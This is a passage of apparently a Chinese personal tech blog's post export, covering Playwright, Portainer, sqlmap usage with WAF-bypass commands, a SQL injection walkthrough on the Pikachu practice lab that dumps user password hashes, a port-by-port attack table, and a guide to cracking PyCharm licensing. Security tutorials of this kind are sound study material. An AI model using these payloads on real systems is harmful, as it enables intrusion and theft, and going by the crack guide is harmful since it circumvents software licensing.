class="line">--load-storage &lt;file&gt;         启动时加载浏览器状态</span><br><span class="line"></span><br><span class="line"># 网络与代理</span><br><span class="line">--proxy-server &lt;url&gt;          HTTP/HTTPS/SOCKS 代理，如 http://127.0.0.1:8888</span><br><span class="line">--user-agent &lt;ua&gt;             自定义 UA 字符串</span><br><span class="line"></span><br><span class="line"># 其他</span><br><span class="line">--timeout &lt;ms&gt;                默认动作超时，毫秒</span><br><span class="line">--ignore-https-errors         忽略 HTTPS 证书错误</span><br><span class="line">--headless                    无头模式运行（默认录制时为 headed）</span><br></pre></td></tr></table></figure>
<h2 id="基础语法速查表">基础语法速查表</h2>
<p><code>Playwright 基础语法速查表（极简版）</code></p>
<table>
<thead>
<tr>
<th>分类</th>
<th>方法</th>
<th>简要说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>浏览器</td>
<td><code>chromium.launch()</code></td>
<td>启动浏览器</td>
</tr>
<tr>
<td></td>
<td><code>browser.newContext()</code></td>
<td>创建隔离上下文</td>
</tr>
<tr>
<td></td>
<td><code>context.newPage()</code></td>
<td>新建页面</td>
</tr>
<tr>
<td>元素定位</td>
<td><code>locator()</code></td>
<td>CSS/XPath/文本通用定位</td>
</tr>
<tr>
<td></td>
<td><code>getByRole()</code></td>
<td>按 ARIA 角色定位</td>
</tr>
<tr>
<td></td>
<td><code>getByText()</code></td>
<td>按文本内容定位</td>
</tr>
<tr>
<td></td>
<td><code>getByTestId()</code></td>
<td>按 <code>data-testid</code> 属性定位</td>
</tr>
<tr>
<td>输入</td>
<td><code>.fill()</code></td>
<td>清空后输入文本</td>
</tr>
<tr>
<td></td>
<td><code>.type()</code></td>
<td>逐字符输入</td>
</tr>
<tr>
<td>点击</td>
<td><code>.click()</code></td>
<td>左键单击</td>
</tr>
<tr>
<td></td>
<td><code>.dblclick()</code></td>
<td>双击</td>
</tr>
<tr>
<td>选择</td>
<td><code>.check()</code></td>
<td>勾选复选框/单选</td>
</tr>
<tr>
<td></td>
<td><code>.uncheck()</code></td>
<td>取消勾选</td>
</tr>
<tr>
<td>下拉</td>
<td><code>.selectOption()</code></td>
<td>选择下拉选项</td>
</tr>
<tr>
<td>键盘</td>
<td><code>.press()</code></td>
<td>发送单个按键</td>
</tr>
<tr>
<td>鼠标</td>
<td><code>.hover()</code></td>
<td>悬停</td>
</tr>
<tr>
<td>文件上传</td>
<td><code>.setInputFiles()</code></td>
<td>设置文件输入框</td>
</tr>
<tr>
<td>截图</td>
<td><code>.screenshot()</code></td>
<td>页面/元素截图</td>
</tr>
<tr>
<td>PDF</td>
<td><code>.pdf()</code></td>
<td>导出 PDF</td>
</tr>
<tr>
<td>断言</td>
<td><code>.toBeVisible()</code></td>
<td>元素可见</td>
</tr>
<tr>
<td></td>
<td><code>.toHaveText()</code></td>
<td>包含文本</td>
</tr>
<tr>
<td>网络</td>
<td><code>page.route()</code></td>
<td>拦截/修改请求</td>
</tr>
<tr>
<td>等待</td>
<td><code>page.waitForURL()</code></td>
<td>等待导航完成</td>
</tr>
<tr>
<td></td>
<td><code>locator.waitFor()</code></td>
<td>等待元素出现</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>代码</category>
        <category>web自动化</category>
      </categories>
      <tags>
        <tag>playwright</tag>
        <tag>web自动化</tag>
      </tags>
  </entry>
  <entry>
    <title>portainer docker的web管理页面</title>
    <url>/2024/10/13/portainer-docker%E7%9A%84web%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2/</url>
    <content><![CDATA[<h2 id="portainer">portainer</h2>
<p>一个web可视化的docker管理页面</p>
<h2 id="拉取镜像">拉取镜像</h2>
<p>先搜索镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search portainer</span><br></pre></td></tr></table></figure>
<p>一般我下载最多下载的那几个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull portainer/portainer-ce</span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --name portainer portainer/portainer-ce</span><br></pre></td></tr></table></figure>
<p>-v 要挂载相关docker守护进程才能让portainer能够管理docker</p>
<p>-p 映射9000端口，默认http;网上的大哥说8000是k8s需要的端口，9443是https端口，没去验证。</p>
<p>接下来就可以登录管理了</p>
<h2 id="初始化配置">初始化配置</h2>
<p>刚进web页面需要设置admin密码，创建账号，这个是直接创建新的管理</p>
<p>也可通过上传配置文件创建</p>
<p>选其中一个即可</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>pycharm激活</title>
    <url>/2024/08/10/pycharm%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="检查链接">检查链接</h2>
<p>网址：<a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p>
<p>带小地图和*的标志，我们点进去<br>
<img src="/images/pasted-27.png" alt="upload successful"></p>
<h2 id="下载工具软件">下载工具软件</h2>
<p>下载图中jetbra.zip<br>
<img src="/images/pasted-28.png" alt="upload successful"></p>
<p>解压，打开文件，进入scripts，双击图中文件<br>
<img src="/images/pasted-30.png" alt="upload successful"></p>
<p>等待10~20秒，会出现一个弹窗done，一般这个时候重启pycharm就已经激活，没有激活可以继续下面步骤。<br>
<img src="/images/pasted-31.png" alt="upload successful"></p>
<h2 id="激活码激活">激活码激活</h2>
<p>点击图中pycharm复制<br>
<img src="/images/pasted-32.png" alt="upload successful"></p>
<p>复制激活<br>
<img src="/images/pasted-34.png" alt="upload successful"></p>
<p><img src="/images/pasted-33.png" alt="upload successful"></p>
<h1>下载的工具软件不能删除，删除失效！！</h1>
]]></content>
      <categories>
        <category>代码</category>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>工具安装</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2025/03/05/sqlmap/</url>
    <content><![CDATA[<h2 id="应用场景">应用场景</h2>
<p>自动测试注入已找到的sql注入漏洞点</p>
<h2 id="命令参数">命令参数</h2>
<h3 id="常用参数">常用参数</h3>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">详解</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-u “url”</td>
<td style="text-align:left">注入的url</td>
</tr>
<tr>
<td style="text-align:center">–data</td>
<td style="text-align:left">post请求payload</td>
</tr>
<tr>
<td style="text-align:center">–cookie</td>
<td style="text-align:left">cookie注入</td>
</tr>
<tr>
<td style="text-align:center">–dbs</td>
<td style="text-align:left">列出所有数据库</td>
</tr>
<tr>
<td style="text-align:center">-tables</td>
<td style="text-align:left">列出所有表</td>
</tr>
<tr>
<td style="text-align:center">-D</td>
<td style="text-align:left">指定数据库</td>
</tr>
<tr>
<td style="text-align:center">-T</td>
<td style="text-align:left">指定表</td>
</tr>
<tr>
<td style="text-align:center">-C</td>
<td style="text-align:left">指定字段</td>
</tr>
<tr>
<td style="text-align:center">–dump</td>
<td style="text-align:left">跟在上面指定的参数一起使用，列出指定的数据</td>
</tr>
<tr>
<td style="text-align:center">–sql-shell</td>
<td style="text-align:left">写shell</td>
</tr>
<tr>
<td style="text-align:center">–batch</td>
<td style="text-align:left">默认选择y</td>
</tr>
<tr>
<td style="text-align:center">–eta</td>
<td style="text-align:left">盲注，显示时间和优化</td>
</tr>
<tr>
<td style="text-align:center">–os-cmd=id</td>
<td style="text-align:left">执行系统命令</td>
</tr>
<tr>
<td style="text-align:center">–os-shell</td>
<td style="text-align:left">系统交互shell</td>
</tr>
<tr>
<td style="text-align:center">–os-pwn</td>
<td style="text-align:left">反弹shell</td>
</tr>
<tr>
<td style="text-align:center">–referer</td>
<td style="text-align:left">使用referer欺骗</td>
</tr>
<tr>
<td style="text-align:center">–users</td>
<td style="text-align:left">列数据库所有用户</td>
</tr>
<tr>
<td style="text-align:center">–threads</td>
<td style="text-align:left">多线程</td>
</tr>
<tr>
<td style="text-align:center">–file-read</td>
<td style="text-align:left">读指定文件</td>
</tr>
<tr>
<td style="text-align:center">–file-write</td>
<td style="text-align:left">写入指定文件</td>
</tr>
</tbody>
</table>
<blockquote>
<p>示例</p>
</blockquote>
<ol>
<li>post请求插入请求表单</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;id=1&amp;&quot; --batch</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>列出数据库系统用户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --users -v 0</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>列出所有数据库名称</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>列出指定数据库的表</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -tables --batch</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>列出指定表的数据</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -T &quot;表名&quot; --dump --batch</span><br></pre></td></tr></table></figure>
<h3 id="安全参数">安全参数</h3>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">详解</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-proxy “url,url”</td>
<td style="text-align:left">代理</td>
</tr>
<tr>
<td style="text-align:center">–tamper</td>
<td style="text-align:left">Tamper 脚本,混淆 Payload</td>
</tr>
<tr>
<td style="text-align:center">–chunked</td>
<td style="text-align:left">分块传输编码</td>
</tr>
<tr>
<td style="text-align:center">–random-agent</td>
<td style="text-align:left">随机化 HTTP 头</td>
</tr>
<tr>
<td style="text-align:center">–delay=5</td>
<td style="text-align:left">请求延迟</td>
</tr>
<tr>
<td style="text-align:center">–headers</td>
<td style="text-align:left">–headers=&quot;X-Forwarded-For:1.1.1.1&quot;添加自定义 HTTP 头</td>
</tr>
<tr>
<td style="text-align:center">–charset</td>
<td style="text-align:left">强制指定字符集,绕过转义字符</td>
</tr>
</tbody>
</table>
<blockquote>
<p>示例</p>
</blockquote>
<ol>
<li>绕过 Cloudflare WAF</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1&quot; \</span><br><span class="line">  --tamper=space2comment,randomcase,versionedmorekeywords \</span><br><span class="line">  --random-agent \</span><br><span class="line">  --delay=3 \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --level=5 \</span><br><span class="line">  --risk=3</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>GBK 宽字节注入</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1%df%27&quot; \</span><br><span class="line">  --charset=gbk \</span><br><span class="line">  --tamper=unmagicquotes \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --dbs</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>JSON 参数注入</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://target.com/api&quot; \</span><br><span class="line">  --data=&#x27;&#123;&quot;id&quot;:&quot;1*&quot;&#125;&#x27; \</span><br><span class="line">  --param-del=&quot;:&quot; \</span><br><span class="line">  --headers=&quot;Content-Type: application/json&quot; \</span><br><span class="line">  --dbms=MySQL</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-v #详细的等级(0-6)<br>
0：只显示Python的回溯，错误和关键消息。<br>
1：显示信息和警告消息。<br>
2：显示调试消息。<br>
3：有效载荷注入。<br>
4：显示HTTP请求。<br>
5：显示HTTP响应头。<br>
6：显示HTTP响应页面的内容</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>sql注入-pikachu</title>
    <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="数字型注入">数字型注入</h2>
<p>使用burp suite工具攻击<br>
如果想要去除干扰信息，后面的id=1可以改成非法id=-2</p>
<h3 id="获取当前数据库名称和版本">获取当前数据库名称和版本</h3>
<ol>
<li>抓包修改参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select database(),version()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-92.png" alt="upload successful"></p>
<ol start="2">
<li>可以得出结果</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,pikachu</span><br><span class="line">your email is: 5.7.26-0ubuntu0.18.04.1-log</span><br></pre></td></tr></table></figure>
<h3 id="获取该数据库表名">获取该数据库表名</h3>
<ol>
<li>修改参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>结果</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,httpinfo,member,message,users,xssblind</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure>
<h3 id="查看表users的列名">查看表users的列名</h3>
<ol>
<li>修改参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>结果</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,id,username,password,level</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure>
<h3 id="查看表users中的账号密码">查看表users中的账号密码</h3>
<ol>
<li>修改参数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(username),group_concat(password) from users&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>结果</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure>
<h3 id="得到的密码进行解码">得到的密码进行解码</h3>
<p>随便搜索在线解密<br>
<img src="/images/pasted-93.png" alt="upload successful"></p>
<blockquote>
<p>其他注入类型原理相似，通过找到SQL命令可执行的格式进行注入，通过sqlmap都能成功注入</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>sql注入</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>switch大气层升级18.1.0</title>
    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="下载离线固件和大气层最新包">下载离线固件和大气层最新包</h2>
<p>下载地址:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>
<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
<h2 id="升级步骤">升级步骤</h2>
<p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
]]></content>
      <categories>
        <category>switch</category>
      </categories>
      <tags>
        <tag>switch大气层</tag>
      </tags>
  </entry>
  <entry>
    <title>switch-大气层与模拟器局域网联机</title>
    <url>/2025/05/01/switch-%E5%A4%A7%E6%B0%94%E5%B1%82%E4%B8%8E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%B1%80%E5%9F%9F%E7%BD%91%E8%81%94%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>大气层与大气层，模拟器与模拟器都有了联机方法，但是大气层与模拟器不能直接联机</p>
<h2 id="安装ldn-mitm">安装ldn_mitm</h2>
<p>是一个用于 Nintendo Switch 的中间人（MITM）系统模块，它通过替换系统中的 ldn 服务来实现局域网（LAN）连接。原本是可以实现互联网连接的插件，龙神模拟器中网络设置支持ldn_mitm，所以无需中间服务器就能让大气层和模拟器连接。</p>
<blockquote>
<p>项目地址：<br>
<a href="https://github.com/spacemeowx2/ldn_mitm">https://github.com/spacemeowx2/ldn_mitm</a></p>
</blockquote>
<blockquote>
<p>下载安装后，就能局域网搜索到了</p>
</blockquote>
]]></content>
      <categories>
        <category>switch</category>
      </categories>
      <tags>
        <tag>switch</tag>
        <tag>大气层</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全攻防-信息收集</title>
    <url>/2024/11/21/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="收集域名信息">收集域名信息</h2>
<h3 id="Whois查询">Whois查询</h3>
<p>在Kali系统中，Whois已经默认安装，只需输入要查询的域名即可</p>
<p>在线Whois查询的常用网站有爱站工具网（<a href="https://whois.aizhan.com">https://whois.aizhan.com</a>）、站长之家（<a href="http://whois.chinaz.com">http://whois.chinaz.com</a>）和VirusTotal（<a href="https://www.virustotal.com">https://www.virustotal.com</a>），通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等</p>
<h3 id="备案信息查询">备案信息查询</h3>
<p>常用的网站有以下这两个。</p>
<pre><code>ICP备案查询网：http://www.beianbeian.com。
天眼查：http://www.tianyancha.com。
</code></pre>
<h2 id="收集敏感信息">收集敏感信息</h2>
<h3 id="搜索引擎使用技巧">搜索引擎使用技巧</h3>
<table>
<thead>
<tr>
<th style="text-align:center">关键字</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Site</td>
<td style="text-align:left">指定域名</td>
</tr>
<tr>
<td style="text-align:center">inurt</td>
<td style="text-align:left">URL中存在关键字的网页</td>
</tr>
<tr>
<td style="text-align:center">Intext</td>
<td style="text-align:left">网页正文中的关键字</td>
</tr>
<tr>
<td style="text-align:center">Filetype</td>
<td style="text-align:left">指定文件类型</td>
</tr>
<tr>
<td style="text-align:center">Intitle</td>
<td style="text-align:left">网页标题中的关键字</td>
</tr>
<tr>
<td style="text-align:center">link</td>
<td style="text-align:left">link:baidu,com 即表示返回所有和 <a href="http://baidu.com">baidu.com</a> 做了链接的 URL</td>
</tr>
<tr>
<td style="text-align:center">Info</td>
<td style="text-align:left">查找指定站点的一些基本信息</td>
</tr>
<tr>
<td style="text-align:center">cache</td>
<td style="text-align:left">搜索 Google 里关于某些内容的缓存</td>
</tr>
</tbody>
</table>
<p>例如：site:域名 intext:后台管理</p>
<p>或者通过github，如数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等。<br>
可以通过乌云漏洞表（<a href="https://wooyun.shuimugan.com">https://wooyun.shuimugan.com</a>）查询历史漏洞信息。</p>
<h2 id="收集子域名信息">收集子域名信息</h2>
<h3 id="子域名检测工具">子域名检测工具</h3>
<p>主要有Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE等</p>
<p>文中主要推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</p>
<h3 id="其他">其他</h3>
<p>搜索引擎查找，例如：site:baidu.com</p>
<p>第三方聚合应用枚举，利用三方服务汇聚的大量DNS数据集，DNSdumpster网站（<a href="https://dnsdumpster.com/%EF%BC%89%E3%80%81%E5%9C%A8%E7%BA%BFDNS%E4%BE%A6%E6%9F%A5%E5%92%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98%E5%87%BA%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%BD%9C%E8%97%8F%E7%9A%84%E5%A4%A7%E9%87%8F%E5%AD%90%E5%9F%9F">https://dnsdumpster.com/）、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域</a></p>
<p>证书透明度公开日志枚举，<a href="http://crt.sh">crt.sh</a>:<a href="https://crt.xn--shcensys-0c2n">https://crt.sh和censys</a>:<a href="https://censys.io">https://censys.io</a></p>
<p>子域名爆破网站（<a href="https://phpinfo.me/domain%EF%BC%89,IP%E5%8F%8D%E6%9F%A5%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%BD%91%E7%AB%99%EF%BC%88http://dns.aizhan.com%EF%BC%89%E7%AD%89">https://phpinfo.me/domain）,IP反查绑定域名网站（http://dns.aizhan.com）等</a></p>
<h2 id="收集常用端口信息">收集常用端口信息</h2>
<p>Nmap（具体的使用方法后续章节会详细介绍），无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具</p>
<p>邮件服务端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">25</td>
<td style="text-align:center">SMTP邮件服务</td>
<td style="text-align:left">邮件伪造</td>
</tr>
<tr>
<td style="text-align:center">110</td>
<td style="text-align:center">POP3协议</td>
<td style="text-align:left">爆破、嗅探</td>
</tr>
<tr>
<td style="text-align:center">143</td>
<td style="text-align:center">IMAP协议</td>
<td style="text-align:left">爆破</td>
</tr>
</tbody>
</table>
<p>文件共享端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">21/22/69</td>
<td style="text-align:center">Ftp/Tftp 文件传输协议</td>
<td style="text-align:left">允许匿名的上传、下载、爆破和嗅探操作</td>
</tr>
<tr>
<td style="text-align:center">2049</td>
<td style="text-align:center">Nfs服务</td>
<td style="text-align:left">配置不当</td>
</tr>
<tr>
<td style="text-align:center">139</td>
<td style="text-align:center">Samba 服务</td>
<td style="text-align:left">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td style="text-align:center">389</td>
<td style="text-align:center">Ldap目录访问协议</td>
<td style="text-align:left">注入、允许匿名访问、弱口令</td>
</tr>
</tbody>
</table>
<p>远程端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">22</td>
<td style="text-align:center">SSH远程连接</td>
<td style="text-align:left">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td style="text-align:center">Telnet 远程连接</td>
<td style="text-align:left">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td style="text-align:center">3389</td>
<td style="text-align:center">Rdp远程桌面连接</td>
<td style="text-align:left">Shift后门（需要Windows Server 2003以下的系 统)、爆破</td>
</tr>
<tr>
<td style="text-align:center">5900</td>
<td style="text-align:center">VNC</td>
<td style="text-align:left">弱口令爆破</td>
</tr>
<tr>
<td style="text-align:center">5632</td>
<td style="text-align:center">PyAnywhere 服务</td>
<td style="text-align:left">抓密码、代码执行</td>
</tr>
</tbody>
</table>
<p>数据库端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">3306</td>
<td style="text-align:center">MySQL</td>
<td style="text-align:left">注入、提权、爆破</td>
</tr>
<tr>
<td style="text-align:center">1433</td>
<td style="text-align:center">MSSQL数据库</td>
<td style="text-align:left">注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td style="text-align:center">1521</td>
<td style="text-align:center">Oracle 数据库</td>
<td style="text-align:left">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td style="text-align:center">5432</td>
<td style="text-align:center">PostgreSQL 数据库</td>
<td style="text-align:left">爆破、注入、弱口令</td>
</tr>
<tr>
<td style="text-align:center">27017/27018</td>
<td style="text-align:center">MongoDB</td>
<td style="text-align:left">爆破、未授权访问</td>
</tr>
<tr>
<td style="text-align:center">6379</td>
<td style="text-align:center">Redis 数据库</td>
<td style="text-align:left">可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td style="text-align:center">5000</td>
<td style="text-align:center">SysBase/DB2数据库</td>
<td style="text-align:left">爆破、注入</td>
</tr>
</tbody>
</table>
<p>web应用端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">80/443/8080</td>
<td style="text-align:center">常见的Web服务端口</td>
<td style="text-align:left">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td style="text-align:center">7001/7002</td>
<td style="text-align:center">WebLogic 控制台</td>
<td style="text-align:left">Java反序列化、弱口令</td>
</tr>
<tr>
<td style="text-align:center">8080/8089</td>
<td style="text-align:center">Jboss/Resin/Jetty/Jenkins</td>
<td style="text-align:left">反序列化、控制台弱口令</td>
</tr>
<tr>
<td style="text-align:center">9090</td>
<td style="text-align:center">WebSphere 控制台</td>
<td style="text-align:left">Java反序列化、弱口令</td>
</tr>
<tr>
<td style="text-align:center">4848</td>
<td style="text-align:center">GlassFish 控制台</td>
<td style="text-align:left">弱口令</td>
</tr>
<tr>
<td style="text-align:center">1352</td>
<td style="text-align:center">Lotus domino 邮件服务</td>
<td style="text-align:left">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td style="text-align:center">10000</td>
<td style="text-align:center">Webmin-Web控制面板</td>
<td style="text-align:left">弱口令</td>
</tr>
</tbody>
</table>
<p>常见协议端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">53</td>
<td style="text-align:center">DNS域名系统</td>
<td style="text-align:left">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td style="text-align:center">67/68</td>
<td style="text-align:center">DHCP服务</td>
<td style="text-align:left">劫持、欺骗</td>
</tr>
<tr>
<td style="text-align:center">161</td>
<td style="text-align:center">SNMP协议</td>
<td style="text-align:left">爆破、搜集目标内网信息</td>
</tr>
</tbody>
</table>
<p>特殊服务端口</p>
<table>
<thead>
<tr>
<th style="text-align:center">端口号</th>
<th style="text-align:center">端口说明</th>
<th style="text-align:left">攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2181</td>
<td style="text-align:center">Zookeeper 服务</td>
<td style="text-align:left">未授权访问</td>
</tr>
<tr>
<td style="text-align:center">8069</td>
<td style="text-align:center">Zabbix服务</td>
<td style="text-align:left">远程执行、SQL注入</td>
</tr>
<tr>
<td style="text-align:center">9200/9300</td>
<td style="text-align:center">Elasticsearch服务</td>
<td style="text-align:left">远程执行</td>
</tr>
<tr>
<td style="text-align:center">11211</td>
<td style="text-align:center">Memcache 服务</td>
<td style="text-align:left">未授权访问</td>
</tr>
<tr>
<td style="text-align:center">512/513/514</td>
<td style="text-align:center">Linux Rexec服务</td>
<td style="text-align:left">爆破、Rlogin 登录</td>
</tr>
<tr>
<td style="text-align:center">873</td>
<td style="text-align:center">Rsync 服务</td>
<td style="text-align:left">匿名访问、文件上传</td>
</tr>
<tr>
<td style="text-align:center">3690</td>
<td style="text-align:center">Svn服务</td>
<td style="text-align:left">Svn 泄露、未授权访问</td>
</tr>
<tr>
<td style="text-align:center">50000</td>
<td style="text-align:center">SAp Management Console</td>
<td style="text-align:left">远程执行</td>
</tr>
</tbody>
</table>
<h2 id="指纹识别">指纹识别</h2>
<p>指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别等</p>
<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<p>常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等</p>
<p>代表工具有<br>
御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS</p>
<p>在线：<br>
BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>
